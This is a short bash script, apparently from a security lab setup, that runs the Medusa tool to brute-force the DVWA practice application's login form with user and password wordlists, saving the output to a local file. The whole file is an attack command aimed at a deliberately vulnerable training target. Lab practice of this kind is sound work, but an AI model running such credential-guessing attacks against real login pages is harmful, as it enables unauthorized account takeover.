#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../data/targets.env"
OUT=./data/out
mkdir -p "$OUT/raw"
# Ajuste o caminho da página e os campos conforme DVWA
medusa -h "$TARGET_DVWA" -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' \
-U data/wordlists/users.txt -P data/wordlists/pass.txt \
-t 4 -T 8 -O "$OUT/raw/medusa_dvwa.txt"
